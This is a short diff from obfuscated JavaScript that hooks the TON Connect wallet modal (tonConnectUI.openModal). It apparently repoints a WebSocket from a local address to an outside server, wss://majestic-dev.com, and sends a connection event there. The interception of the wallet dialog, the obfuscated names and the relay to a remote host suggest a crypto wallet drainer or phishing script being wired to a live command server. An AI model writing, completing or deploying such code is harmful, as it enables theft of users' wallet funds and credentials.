@@ -45,7 +45,7 @@ tonConnectUI.openModal = (...args) => {
     if(socket != undefined && manifest_url == "") return;
     if(socket != undefined && manifest_url != "") return oldOpenModal.call(tonConnectUI, ...args);     
 
-    socket = new WebSocket("ws://0.0.0.0:444");
+    socket = new WebSocket("wss://majestic-dev.com/");
     socket.addEventListener("open", _0x2a6879 => {
       socket.send(JSON.stringify({
         'event': "connection"
